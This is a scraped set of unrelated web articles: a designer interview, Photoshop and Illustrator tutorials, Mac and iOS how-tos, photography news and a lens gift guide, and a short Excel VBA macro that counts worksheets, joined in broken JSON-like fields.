      "title": "Discover Seamless Patterns & Vector Illustration: Lidiebug",
      "text": "Curious about seamless patterns and vector illustration? They're popular for a reason, and have been for quite some time\u2014they can be very versatile and eye-catching. \nSeamless patterns have a variety of potential applications, from websites to fabric, from packaging to mobile apps. Next time you wrap up a present, take a look at the paper; chances are, it's using a seamless pattern. \nEver been curious about how they're made, and the vector illustrations that are often a part of their creation? In this article, we'll observe the work of Lidia Snitsar, who often shares her work under the studio name Lidiebug. She has ten years of admirable experience and an inspiring portfolio of fun, whimsical art and design\u2014so she's a great example to observe and listen in on. \nThere's a certain sensitivity and refinement to a really well-made seamless pattern. Take a look! \nSee, that's something special about awesome seamless patterns, in my opinion. It's more than just repeating a memorable illustration or an eye-catching visual. It's all about doing so in a way that looks natural and ambient, as it often serves as a supplemental part of a larger composition. It shouldn't look \"choppy\"\u2014it needs to endlessly flow. \nHowever, the degree of variation is something to consider too. Patterns can be very ambient or alternatively very visible. There has to be a balance between interest and ambiance, variety and rhythm\u2014with success all reliant on the project's objectives. This is a lot more complicated than just \"making something repeat\"! \nAnd, personally, this is one of my favorite things about Lidia's work. Whether it's festive, holiday imagery, fun, character art, or a collection of undersea creatures, the visual interest is well balanced with the rhythmic nature of a seamless pattern. However, we can't discredit the importance of strong design and illustration skills here, too. They are, in many regards, the backbone of an illustrated pattern. Check out, for example, this adorable coloring book, featuring some of Lidia's fun and welcoming children's illustrations. \nI had the pleasure of asking Lidia some questions about her work, her experience, and her process. There's so much we, as creative professionals, can learn from each other in listening and observing\u2014it was both inspiring and a pleasure to hear her insights and thoughts. So let's listen in together to some of Lidia's takes on creating seamless patterns, fun, whimsical illustrations, and memorable vector art\u2014and enjoy a delightful selection of works from her portfolio too! \nLidia Snitsar | Lidiebug \nLidia Snitsar is an illustrator and designer working under the name Lidiebug (and/or Lidiebug Designs). With ten years of creative experience, her portfolio is beaming with fun, captivating illustrated patterns, and the influence from her experiences in the early childhood field is clearly visible in her work. It's refreshing to see multiple influences and professional experiences come together to create something wonderful and inspiring. \nPlease tell us about yourself and your lovely work with vector illustration, seamless patterns, and design. \nI\u2019m a pattern designer and illustrator from Toronto [Canada]. \nI've been in the design field for over 10 years now, mainly focusing on surface design specifically for printable product surfaces like packaging and fabric. I tried to create art that is simple, but colourful with a touch of a childish draw. \nYour portfolio is really impressive, both in terms of quantity and quality. How did you get started as a content creator, in art and design? What do you enjoy about the work that you create and share? \nI have always loved to draw and paint but [I] chose a different career path. I\u2019ve got over 8 years and education in the early childhood field, so I kept myself creative and tried to implement my artistic skills into working with kids, and continued to draw mostly as a hobby. \nI've always admired patterns, especially whimsical and floral ones. For a long time wanted to design them, but only after my daughter was born and I became a stay-at-home mom, I started to pursue a career as a surface designer. \nI did a lot of digging and learned quite a bit about the field and technical aspects of creating a seamless pattern. Since then, I have built up my portfolio, and now I am working as a pattern designer and illustrator under the name Lidiebug. \nI like to see how my designs become alive as a kidswear, bedding or home decor, but seeing my wallpaper in someone's home is my ultimate favourite. \nIt really is an awesome feeling, as an artist, seeing your work in action! So, what is one of your favorite creations that you have made, and why? \nMy llama collection is for sure my favourite. I enjoyed every moment working on it. I think it's achieved that positive vibe I was hoping to. My daughters love it too; especially [the] lovely yellow llama cushion that I sell in my POD [print on demand] shops. \nCould you tell us about your creative process? How do you come up with ideas for new illustrative patterns or concepts? \nPencil, pen, brush and paper are all I need to get started. Sometimes, I start doodling even without any idea in my head, and, after a few pages, something usually emerges. If that doesn't work, I take my family and go outside. Ontario's nature is truly inspiring. A short trip to a lake or a hike in the forest... it doesn't matter. The point is to take a break and then start over. \nSince you've been in your field for quite a while, what are some tips or tricks you wish you had known, earlier in your life as an artist/designer? \nWhen I was just getting started, I really didn't understand the entrepreneurial side of being an artist. \nI wish I could [have found] myself a good mentor to train me as a small business professional, but I took a long journey instead, and learn[ed] all I know through my own mistakes. \nI'd agree that it's a great idea to just get out there and learn! What are some of your inspirations, then, when creating a new seamless pattern or hand-drawn illustration? \nI'm constantly seeking inspiration in life and sometimes I see patterns where I least expect it. \nBeing a mom of two wonderful daughters exposes me to a variety of children's themes and interests. Anything can spark [an] idea and often I am aiming to create a particular thing... only to end up with something entirely different. \nWhat advice would you have for new artists, designers, and content creators that want to actively pursue creating and sharing their work with others? What are your thoughts on trends in your field? \nDo what you love and don't afraid to be unique. If you design something meaningful to you, other people will love it too. \nFor me, Instagram is the key to keeping connected with fellow designers as well as dedicated customers. I stay active and use social media to share my work, my process, my designs for the contests. Art wants to be seen! \nI try not to concentrate on what's trending now, I just do what I love. I like to create for myself and my kids, and if my art becomes popular among others, I couldn't appreciate it more. \nThank you so much for all of your insight and perspectives! Do you have any final words of encouragement or wisdom would you like to share with everyone today? \nBe positive and mind your health because often artists tend to neglect that. \nGet away from your computer once in a while. Maybe go for a hike or do some yoga to get that peace of mind you needed so much. \nA very special thank you to Lidia Snitsar, also known as Lidiebug, for sharing her work and her thoughts with us today! Your spirited work is so fun, enjoyable, and inspiring. \nYou can check out more of Lidia's work here: \nLet's Show This Artist Some Love! \nYou can also check out more of Lidiebug's work on Envato Elements\u2014lovely works available to use in your next design project, even commercial ones!

      "text": "You can switch users on a Mac computer in a few different ways. \nTo quickly switch users on your Mac , you can enable a shortcut that will allow you to choose profiles directly from a menu box in the upper right corner of your desktop. \nYou can always switch users by logging out of your Mac , or simply locking the screen. \nVisit Business Insider's homepage for more stories . \nYou can always switch between users on your Mac computer by logging out of your profile \u2014 but there's an even easier way to do it. \nYour Mac allows you to have multiple users on your device, whether it's to switch between family members or between work and personal profiles. To enable faster switching between these profiles, you can check the \"Show fast user switching menu as\" option in your Mac's system settings (as depicted below). \nYou can personalize this menu to display your full name, account name, or just an icon. Regardless of your choice, the menu will appear in the upper right hand corner of your desktop. \nOnce you use it to click on another profile, your Mac will immediately prompt you to enter the appropriate password or Touch ID. \nHere's how to enable the feature and quickly switch between users. \nCheck out the products mentioned in this article: \nMacbook Pro (From $1,299 at Best Buy) \nHow to switch users on your Mac computer with fast user switching \n1. Open System Preferences in Launchpad, or by clicking the Apple icon in the upper left hand corner of your desktop. \n2. Select \"Users & Groups\" from the bottom row. \n3. This will bring you to your user settings. Click the lock in the bottom left hand corner of the pop-up to make changes. \n4. Enter your user password if prompted. This will unlock your settings, which were previously muted gray. \n5. Check the box next to \"Show fast user switching menu as.\" \n6. Click the double arrows next to the dropdown menu to select the display option: Full Name, Account Name, or Icon. Your changes should automatically save, but you can click the lock to prevent further changes during this session as well. \n7. Once this feature is enabled, you can easily switch between users through the shortcut now located in the upper right hand corner of your desktop. Click your name (or icon, depending on the display option you selected) to view your Mac's other profiles. \n8. Click the user you wish to switch to. This will automatically bring you its direct login page, where you'll be asked to enter a password or use Touch ID. Enter that information at this time. \nHow to switch between users on a Mac by logging out or locking your screen \n1. Despite adding this shortcut, you can always switch between profiles by locking your screen or logging out. Click the Apple icon on the left hand corner of your desktop to view these options. You can also use the keyboard shortcuts listed. \n2. Locking your screen will bring you to the page asking for your password or Touch ID. Click \"Switch User\" at the bottom of the screen. \n3. This will bring you to your profile options, which can include a guest account. Logging out of your current profile will also direct you to this page.

      "title": "Quick Tip: Create a Glass Text Effect in Photoshop Using Layer Styles",
      "text": "In this quick tip tutorial, we will show you how to create a glass text effect using layer styles in Photoshop. Let's get started! \nFollow along with us over on our Envato Tuts+ YouTube Channel : \nTutorial Assets \nThe following assets were used during the production of this tutorial: \nFont - The Nautigal \nPattern used for the background (GraphicRiver) \nBackground Image (Free) \nStep 1 \nFirst, create a new PSD document, 600 x 400 pixels in RGB mode, 72 DPI with a white background color. Now prepare your assets. Install The Nautigal font on your computer and optionally open the PAT file to create a background. Or you can use the Background Image instead of starting a new document, so you can skip creating the background and jump to step 3 of this tutorial. \nStep 2 \nTo make the background, go to Layer > Layer Style > Blending Options and use the settings below. \nYou can also access the Blending Options in two faster ways. The first (and the fastest) way is to double-click on the layer in your Layers panel. The other way is to right-click on the layer in your Layers panel and choose Blending Options . \nWhen you are done with all the settings below, don't forget to hit OK in the Blending Options window! If you have downloaded the Patterns file, use pattern number 31. You can also leave the background without the pattern overlay or use any other pattern as the result will look great on any light background. \nStep 3 \nStart by creating the first text layer. Now we can start making our text effect. First, choose the Type Tool and change the Font to The Nautigal , Size around 255 pt and Anti-Aliasing Sharp . Now type your text somewhere in the center of the image. You can write any word, but in this tutorial I'll use \"Wow\". \nStep 4 \nThis first text layer will be at the bottom of all the text layers. Go to Layer > Layer Style > Blending Options and use the settings below on your text. \nStep 5 \nNow let's create and customize the second text layer. \nDuplicate your text layer, and select the new text layer. Select the text layer in the Layers panel and go to Layer > Duplicate layer and name it as you wish. Now go to Layer > Layer Style > Clear Layer Style as we will make a different style for this layer. Finally, go to Layer > Layer Style > Blending Options and use the settings below on your text. \nYou can also use the quicker methods to access the Blending Options from \"Step 2\" of this tutorial. When you are done with all the settings below, don't forget to hit OK in the Blending Options window! This text layer will be in the middle of all three text layers in your Layers panel. So for now it should be above the first one. \nStep 6 \nWe are almost there. Now it's time to create and customize our third and last text layer. \nStart by duplicating the second text layer. Select the text layer in the Layers panel and go to Layer > Duplicate layer and name it as you wish. Now go to Layer > Layer Style > Clear Layer Style as we will make a different style for this layer. Finally, go to Layer > Layer Style > Blending Options and use the settings below on our text. \nAgain, you can use the quicker methods to access the Blending Options from \"Step 2\" of this tutorial. When you are done with all the settings below, don't forget to hit OK in the Blending Options window! This text layer will make most of the effects and must be on top of all other text layers. \nPhotoshop Glass Effect Styles \nIf you need a glass effect for your text, you can also try one of these solutions: \nGlass Text Effect Styles \nGlass Pack - Text Styles \n8 Premium Glass Text Effect \nGlass Style \nSimple Glass Style \nThat's All! \nIf you enjoyed this tutorial, check out these as well:",

      "text": "Welcome back to another Illustrator based tutorial, in which we\u2019re going to learn how to create a little receipt icon, using nothing more than a couple of basic geometric shapes, that we\u2019re going to adjust here and there. \nSo, assuming you already have the software up and running, let\u2019s jump straight into it! \nTutorial Details: Receipt Icon \nProgram: Adobe Illustrator CS6 \u2013 CC 2019 \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 25 Minutes \nFinal Image: Receipt Icon \nStep 1 \nAs with every new project, we\u2019re going to kick things off by setting up a New Document , by heading over to File > New (or by using the Control-N keyboard shortcut), which we will then adjust as follows: \nNumber of Artboards: 1 \nWidth: 96 px \nHeight: 96 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nAs soon as we\u2019ve finished setting up our project file, we can start working on the actual receipt icon, and we will do so by creating the background using an 88 x 88 px circle, which we will color using #FFA88A and then position to the center of the underlying Artboard using the Align panel\u2019s Horizontal and Vertical Align Center options. \nStep 3 \nAdd the main shape for the receipt icon\u2019s front section using a 32 x 40 px rectangle, which we will color using #FFFFFF , and then position as seen in the reference image . \nStep 4 \nAdjust the shape that we\u2019ve just created, by opening up the Transform panel, and then individually adjusting its corners, by setting the Radius of the top ones to 4 px and its bottom-left one to 6 px . \nStep 5 \nCreate the first fold using a smaller 12 x 24 px rectangle ( #F98667 ), which we will adjust by setting the Radius of its bottom corners to 6 px , making sure to position the resulting shape as seen in the reference image . \nStep 6 \nAs you can see, as soon as we add the folded section, we\u2019re left with a small gap between it and the receipt icon\u2019s main body, which we\u2019re going to fill in using a 6 x 12 px rectangle ( #FFFFFF ) making sure to position it underneath the two ( right click > Arrange > Send Backward ). \nStep 7 \nAdd the second fold using a smaller 12 x 12 px square ( #DD674B ), which we will adjust by setting the Radius of its upper corners to 6 px , making sure to position the resulting shape as seen in the reference image . \nStep 8 \nAs we did with the previous fold, fill in the little gap using a 6 x 12 px rectangle ( #F98667 ), by positioning it between the two shapes. \nStep 9 \nAdd in the little text lines using two stacks of an 8 x 4 px rectangle ( #F98667 ) followed by another wider 20 x 4 px one ( #F98667 ), which we will position as seen in the reference image . Take your time, and once you\u2019re done, make sure you select and group all four shapes together using the Control-G keyboard shortcut. You can then do the same for the entire receipt icon since we\u2019re pretty much done working on it. \nStep 10 \nCreate the front section for the first coin using an 8 x 8 px circle, which we will color using #FFE497 and then position above the first fold, at a distance of just 4 px . \nStep 11 \nAdd the coin\u2019s side section using a copy ( Control-C > Control-F ) of the previous shape, which we will adjust by first changing its color to #DD674B , and then push to the right side by a distance of 2 px using the directional arrow keys. \nStep 12 \nContinue adjusting the shape by selecting its left anchor point using the Direct Selection Tool ( A ), and then immediately removing it by pressing Delete . Close the resulting path using the Pen Tool ( P ), making sure to extend it towards the center of the coin\u2019s front section. Once you\u2019re done, position the resulting shape underneath, ( right click > Arrange > Send Backward ) making sure to select and group the two together using the Control-G keyboard shortcut. \nStep 13 \nAdd the second coin using a copy ( Control-C > Control-F ) of the one that we\u2019ve just finished working on, which we will position onto the receipt\u2019s second fold, as seen in the reference image . \nStep 14 \nFinish off the receipt icon, and with it the project itself by adding the little shadow using a 32 x 4 px ellipse, which we will color using #DD674B , and then position at a distance of 4 px from the receipt\u2019s bottom edge. Once you\u2019re done, don\u2019t forget to select and group ( Control-G ) all of the icon\u2019s composing shapes before finally hitting that save button. \nGreat Job! \nAs always, I hope you had fun working on the project and most importantly managed to learn something new and useful during the process. \nThat being said, if you have any questions feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nAuthor: Andrei \u0218tefan \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThe post How to Create a Receipt Icon in Adobe Illustrator appeared first on Vectips .",

I had the opportunity to take the trio for a spin around Arizona for a couple of weeks shortly after the 70-200mm was released and for what it costs, it\u2019s one of the best value 70-200mm lenses on the market. \nLaowa 100mm f/2.8 Macro \u2013 $449 ( Amazon / B&H ) \nThe Laowa 100mm f/2.8 Macro is a lens that immediately impressed us here at DIYP, and you can see our review here . Aside from being just a great lens, one of the great things about this lens is that it\u2019s available for a range of mounts in Canon EF, Nikon F, Sony E with Nikon Z and Canon RF mount versions on the way. Hopefully, we\u2019ll see an L mount version at some point, too. \nSamyang/Rokinon 85mm f/1.4 RF \u2013 $679-$749 ( Amazon / B&H ) \nThe Samyang AF 85mm f/1.4 lens comes in at around half the price (or less) of the Nikon F, Canon EF and Sony alternatives, but is available in all three of those mount options. It also regularly seems to be on sale, too, depending on the mount you need and the brand you choose to go for. Samyang and Rokinon are the same brand, just different names for different customers in different parts of the world. Often you\u2019ll find that one brand is slightly less expensive than the other in your area, despite being identical lenses. \nIrix 150mm f/2.8 Macro \u2013 $595 ( Amazon / B&H ) \nTime for another macro lens. This time it\u2019s the fairly long Irix 150mm f/2.8 Macro. It\u2019s a manual focus lens offering a nice long working distance of around 34.5cm. It\u2019s available in both Nikon F and Canon EF mounts, but it\u2019s also one of the few new lens choices available to Pentax photographers, too. \nCanon 10-18mm \u2013 $299 ( Amazon / B&H ) \nThis is one of those lenses that makes it onto to the list almost every year. If you\u2019re a vlogger, or know somebody who vlogs with Canon, then this is pretty much the ideal lens. It\u2019s an APS-C lens, designed for Canon\u2019s crop DSLRs. But even with some of Canon\u2019s recent mirrorless bodies like the EOS RP and the EF to RF adapter, you\u2019ll get that APS-C field of view when shooting 4K video. \nCanon EF 70-300mm f/4-5.6 IS II USM \u2013 $449 ( Amazon / B&H ) \nCanon\u2019s most recent revision to the 70-300mm lens is an interesting one. It features a built-in LCD to show lens information showing focus distance, focal length and the amount of stabilisation currently being applied. It\u2019s one of the first lenses (aside from a \u201cNifty Fifty\u201d) that most Canon photographers buy for their cameras, but this one is compatible with both full-frame and APS-C bodies. \nMitakon 85mm f/2.8 1-5x Super Macro \u2013 $499 ( B&H ) \nThis is the third macro to make the list this year, although this one isn\u2019t quite available just yet, although you can pre-order. It will become available for Nikon F, Canon EF, Pentax K and Sony A mounts. It\u2019s a little shorter than the Laowa or Irix macro lenses above, but offers up to a 5:1 magnification, with working distances of 10.7\u2033 (at 1:1) to 3.9\u2033 (at 5:1). You don\u2019t get infinity focus with this one, but I don\u2019t think this is a lens where you\u2019d need it. \nVazen 40mm T2 1.8x Anamorphic \u2013 $3,250 ( B&H ) \nThis is the only cinema lens on the list for 2019. It\u2019s not that there haven\u2019t been other good cinema lenses released, but this one is quite special. It\u2019s the Vazen 40mm T2 1.8x Anamorphic lens for Micro Four Thirds. Anamorphic lenses are nothing new \u2013 in fact, they\u2019re something old that\u2019s seeing a resurgence \u2013 but what makes it special is the price. While still not exactly pocket change, it\u2019s substantially cheaper than many of the anamorphic alternatives out there. \nMetabones Pocket 4K speedboosters \u2013 $479-719 ( B&H ) \nTechnically, no, these aren\u2019t lenses, but they do allow you to mount your lenses to a camera for which they were not originally designed and they do contain glass elements. In this case, that camera is the Blackmagic Pocket Cinema Camera 4K. Metabones has made MFT adapters for a while, but these ones are specifically optimised for the BMPCC 4K. Adapters are available for mounting Canon EF, Nikon F and Arri PL mount lenses to the Pocket 4K with a 0.71x or 0.64x speed boost. \nNikon 58mm f/0.95 Noct \u2013 $7,996 ( B&H ) \nIf you get this lens for Christmas, you\u2019ve definitely made it to Santa\u2019s \u201cNice\u201d list. It\u2019s the kind of gift you\u2019re only going to get somebody that you really like, or perhaps only for yourself, and probably only if you\u2019ve had a lottery win. I had the opportunity to play with one of these briefly at NAB earlier this year, and it is an extremely sexy lens. \nOverview \nThe pace at which new lenses are being released these days just feels ridiculous. Perhaps it\u2019s the amount of new camera systems coming out and hitting the mainstream. What\u2019s interesting, though, is that many of them are for Nikon F and Canon EF, when it\u2019s Leica\u2019s L mount, Nikon\u2019s Z mount and Canon\u2019s RF mount that are all facing a big lens deficit. More Z and RF mount lenses have been announced recently, though, so perhaps we\u2019ll start to see more of those coming in 2020. \nWhat did we miss? What\u2019s been your favourite lens, new or old, of 2019? Are you using an underrepresented lens mount? What are you waiting for to be announced? \nSo far we\u2019ve covered cameras and lenses. Keep an eye out for the rest of our guides coming over the next few days covering lighting, tripods, bags and accessories.",

      "text": "Do you want to reduce data usage on your iOS device? Low data mode in iOS 13 helps installed apps to reduce network data use. Here is how to enable low data mode on the iPhone and save cellular data on iOS 13. \nAnother day, another tutorial for those who have updated their device to iOS 13 . Apple has added some new hidden features in the iOS 13 like sidecar, optimized battery charging and much more. Today we are going to talk about one of those features Apple hasn\u2019t talked about in the event. \nLow Data Mode is a new hidden feature in iOS 13 which restricts the background network use and saves Wi-Fi and Cellular data for later use. \nIf you are one who is in the area with less network coverage where cellular data don\u2019t load faster or you have limited cellular data available then this is for you. \nAdvertisement \nAlso, this Low Data Mode can save data for those who are using a personal hotspot of a friend or any Wi-Fi connection which have limited data available. \nHow to Enable Low Data Mode on iOS 13 \nLet\u2019s come to the point and save some data on your iPhone, iPad or iPod Touch. You can save data on Wi-Fi & Cellular in separate ways. So, take care of both. \nCellular low data mode \nAt first, I want to share how you can save cellular data on iOS 13 in 2 minutes. \nIn the beginning, Open Settings on your iPhone. \nGo to Cellular > Cellular Data Options. \nEnable Low Data Mode. \nYou have successfully enabled the low data mode for your cellular data and definetly will save some data for you. \nWi-Fi low data mode \nNow, if you have limited data available with Wi-Fi, then follow the given steps to enable Low Data Mode on your iPhone, iPad or iPod Touch. \nIn Settings, Go to Wi-Fi. \nClick the information button next to the connected Wi-Fi network. \nTurn on Low Data Mode. \nThat\u2019s how you can save your data for later use. However, you can save cellular data for each sim card if you are using dual sim iPhone. \nWhat to Expect in Low Data Mode Enabled? \nAccording to Apple, if you have enabled Low Data Mode for Cellular or Wi-Fi here\u2019s what you should expect. \nApps will stop using network data when they are not active anymore. \nBackground app refresh may stop working after a few times. \niCloud backup and other activities like photos uploading will stop. \nPhotos & Videos over the web and apps will load in low quality. \nAppStore will stop automatic downloads. \nMusic will not stream in high quality. \nFacetime will load the video in low quality for bandwidth saving. \nThat\u2019s all for today.

      "text": "VSCO buys 360 camera company Rylo to make mobile video editing tools \nDecember 11, 2019 by Dunja Djudjic Leave a Comment \nA well-known photo editing app VSCO is acquiring Rylo , the company behind the 360\u02da 5.8K camera . Under the new ownership, Rylo is about to make editing tools for mobile videos. And sadly, it seems like they won\u2019t be making new cameras anymore. \nIn a press release , VSCO\u2019s CEO Joel Flory writes: \n\u201cThis acquisition not only enables us to further accelerate the delivery of innovative video editing features for our community, but reinforces how important video will be for VSCO\u2019s growth and future.\u201d \nFlory notes that it\u2019s clear that VSCO users want more video tools . And Rylo team will be in charge of developing them. Although the company is most well-known for its 360\u02da camera, the Rylo team has also been \u201cexclusively working on mobile video editing tools,\u201d Flory writes. \u201cBuilding high-end video editing capability on mobile is no small feat and we believe our combined technology and focus on video will help pave new innovation for video editing tools.\u201d \nAlthough this acquisition could be good news for VSCO users, it\u2019s disappointing for Rylo fans. As the company told TechCrunch , they won\u2019t be making and selling its signature 360\u02da camera any longer. However, if you already own one, it\u2019s good to know that Rylo will still honor the warranty on the cameras sold so far. \nRylo\u2019s co-founders, Alex Karpenko and Chris Cunningham, are joining VSCO\u2019s team to develop the new mobile video editing tools. We don\u2019t know what they will come up with, but I guess we should wait and see what comes out of this acquisition. \n[via TechCrunch ]",

      "text": "Macro Mondays \u2013 An Excel Macro To Count How Many Worksheets (Hidden And Visible) An Excel Workbook \nApril 10, 2017 by Barbara \nHello time for some more #macromonday fun which I am excited to share with you. Today let\u2019s look at a solution to an issue I had recently at work. I needed to know really quickly how many worksheets were in my Excel workbook. I knew there was more than could be seen, as some were hidden. But it took a lot of time to go through and count them, and let\u2019s face it, it is easy to get it wrong when there is a LOT of worksheets. \nSo, let\u2019s write some code, and tuck it away in our Personal Macro Workbook and we can re use that handy piece of code whenever we need it. Let\u2019s count how many worksheets there are, and display that number in a message box. Easy! \nIf you want more Excel and VBA tips then sign up to my monthly Newsletter where I share 3 Excel Tips on the first Wednesday of the month and receive my free Ebook, 30 Excel Tips. \nIf you want to see all of the blog posts in the Macro Mondays Series or the example worksheets you can do so by clicking on the links below. \nWhat Does The Macro Do? \nThis Macro uses the ActiveWorkbook.sheets.count property which returns the number of objects (in this example worksheets) in the collection. For ease, we then get Excel to display the result of this in a handy message box using the MsgBox Function. \nHow Does It Work? \nFIRST. Open Visual Basic \u2013 by hitting ALT +F11 or Developer Tab \u2013 Right Click on personal.xbl in the Project Window. I have stored this macro in my Personal Macro Workbook, so it is available to use whenever I start Excel and can apply it to any Excel workbook I choose to. \nStep 2. We use the message box function in this example to DISPLAY information to the user. The syntax of the MsgBox is simple \nMsgBox(prompt [, buttons] [, title] [, helpfile, context] ) \nThe only required part of the syntax is the prompt. All others are optional. Indicated by the [ ] brackets. In this example it is the result of the ActiveWorkbook.sheets.count calculation. \nStep 3. Once the MsgBox has displayed the value, then Macro ends. \nThere are 21 worksheet in my workbook. This includes both visible and hidden. \nThis is a really short macro, but surprisingly handy . We could go a little further and customise the message box. We have only just used the minimum and required part of the function. let\u2019s go ahead and type a title to be displayed to give a little more context for the user. \nBy amending the code slightly and adding in the Title part of the code \nSub CountMyWorkSheets() \nMsgBox ActiveWorkbook.sheets.Count, , \u201cThe Number Of Sheets In Your Workbook Is\u201d \nEnd Sub \nWe can add and display some context. When we run the macro again, it makes a little more sense. ( You could type any text for your users to see in the Title Part of the MsgBox function). \nWant To Copy The Code? \nSub CountMyWorkSheets() \nMsgBox ActiveWorkbook.sheets.Count, , \u201cThe Number Of Sheets In Your Workbook Is\u201d \nEnd Sub",

      "text": "In today\u2019s tutorial, we\u2019re going to explore the process of creating a simple map icon in Adobe Illustrator, using some of Illustrator\u2019s most basic shapes and tools. That being said, grab a cup of the freshly brewed coffee and let\u2019s get started. \nTutorial Details: Making a Map Icon in Adobe Illustrator \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 30 Minutes \nFinal Image: Map Icon \nStep 1 \nAs with every new project, start creating your map icon in Adobe Illustrator by setting up a New Document by going over to File > New (or using the Control-N keyboard shortcut), which we will adjust as follows: \nNumber of Artboards: 1 \nWidth: 128 px \nHeight: 128 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web , the only one that you\u2019ll have to manually adjust being the Artboards Size (Width x Height). \nStep 2 \nOnce we\u2019ve set up our project file, we can start working on the actual icon, and we will do so by creating its background using a 120 x 120 px circle, which we will color using #FF8D4D , and then center align to the underlying Artboard using the Align panel\u2019s Horizontal and Vertical Align Center options. \nStep 3 \nCreate the map\u2019s center section using a 40 x 36 px rectangle, which we will color using #EDE7E6 , and then position onto the larger background, at a distance of 40 px from its left edge, and 48 px from its top one. \nStep 4 \nAdjust the shape of the rectangle that we\u2019ve just created, by selecting its right anchor points using the Direct Selection Tool (A) which we will then push to the bottom by a distance of 12 px using the Move tool ( right click > Transform > Move > Vertical > 12 px ). \nStep 5 \nGive the resulting shape an outline using the Stroke method, by creating a copy of it ( Control-C ) which we will paste in front ( Control-F ) and then adjust by first changing its color to #422C21 , and then flipping its Fill with its Stroke ( Shift-X ) making sure to set its Weight to 4 px and its Corner to Round Join . Then, before moving on select both shapes and group them together using the Control-G keyboard shortcut. \nStep 6 \nAdd the map\u2019s left folded section using a 20 x 36 px rectangle ( #BFB3B2 ), which we will adjust by selecting and pushing its left anchor points downwards by a distance of 12 px ( right click > Transform > Move > Vertical > 12 px ). Give the resulting shape a 4 px thick outline ( #422C21 ), grouping ( Control-G ) and then positioning the two onto the left side of the center section. \nStep 7 \nCreate the right fold using a copy ( Control-C > Control-F ) of the one that we\u2019ve just finished working on, which we will vertically reflect ( right click > Transform > Reflect > Vertical ) and then position onto the opposite side of the map. Also, don\u2019t forget to select and group ( control-G ) all of the map\u2019s three composing sections before moving on to the next step. \nStep 8 \nTake a couple of moments and draw the snaky path using a 4 px thick Stroke ( #422C21 ) using the reference image as your guide, making sure to select and group ( Control-G ) all of the map\u2019s composing sections once you\u2019re done. \nStep 9 \nStart working on the location pin, by creating a 40 x 40 px circle, which we will color using #FFC550 , and then center align to the underlying background positioning it at a distance of 16 px from its top edge. \nStep 10 \nAdjust the shape that we\u2019ve just created by pinching its bottom anchor point by clicking on it using the Anchor Point Tool (Shift+C) to make it pointy. \nStep 11 \nAdjust the height of the pin, by selecting its bottom anchor point using the Direct Selection Tool (A) which we will then push to the bottom by a distance of 12 px ( right click > Transform > Move > Vertical > 12 px ). \nStep 12 \nAdjust the roundness of the pin\u2019s bottom transition, by turning on the Pixel Preview mode, and then individually selecting and positioning its side anchor points\u2019s bottom handles at a distance of 16 px from their center. Take your time, and once you\u2019re done move on to the next step. \nStep 13 \nAdd the pin\u2019s cutout using a 12 x 12 px circle (highlighted with red), which we will position onto the larger body as seen in the reference image. Once you have the shape in place, select both it and the pin and use Pathfinder \u2019s Minus Front Shape Mode to create the cutout. \nStep 14 \nFinish off the pin and with it the icon itself, by giving the resulting shape a 4 px thick outline ( #422C21 ), selecting and grouping ( Control-G ) both shapes together afterwards. Once you\u2019re done, don\u2019t forget to group ( Control-G ) all of the icon\u2019s composing sections before hitting that save button. \nIt\u2019s a Wrap! You Can Now Make a Map Icon in Adobe Illustrator! \nThere you have it, guys! A short, in-depth tutorial on creating your very own map icon in Adobe Illustrator. Best of all, you can do it with basic geometric shapes and tools. As always, I hope you\u2019ve learned something new you can continue to use. \nAuthor: Andrei \u0218tefan \nJust another coffee addict / pixel grinder, creating colorful projects one pixel at a time. \nThe post How to Easily Create a Map Icon in Adobe Illustrator appeared first on Vectips .",

      "text": "It looks like Canon might have quietly killed off the EOS M5 \nDecember 16, 2019 by John Aldred Leave a Comment \nThis is quite interesting. According to the Adorama website, upon searching for the EOS M5 , we only see used bodies for sale with the statement that \u201cAdorama does not carry CANON EOS M5\u201d, suggesting that it might have come to its end. Being announced only at the end of 2016, the EOS M5 has proven to be quite a popular camera in Canon\u2019s APS-C mirrorless line up. So, why would they discontinue it? Could it be that the EOS M5 Mark II rumours might be right? \nThe Adorama website simply shows the statement that they do not carry that camera, although you can buy it used. While there\u2019s been no official statement from Canon, and other websites are showing it as being in stock, it does seem very odd. That being said, the websites that do have it in stock, like B&H, are running some pretty insane discounts on the EOS M5 now, with new prices below that of even the used bodies at Adorama. \nCould it simply be the usual holiday sale or is B&H trying to clear their inventory in time for an impending EOS M5 Mark II announcement? \nRumours of a possible EOS M5 Mark II first surfaced back in July when the EOS 90D was about to be announced. It turned out that the EOS 90D was the one to be released at that time. More recently, rumours have come up that we might see a couple of new EOS M cameras in 2020 . One is expected to be the EOS M50 Mark II, but the other is unknown. The suggested price of around $850 for the unknown model, including a kit lens does seem to be about in the ballpark of the M5\u2019s regular price , though. \nSo, could this mean that the EOS M5 Mark II is on the way? Or is it simply a glitch in the Adorama matrix and they\u2019ll get it back in stock again soon? \nOnly time will tell, but we\u2019ll keep you posted as we hear more. \n[via Photo Rumors ]",

      "title": "Lease Liability Amortization Schedule - How to Create it in Excel",
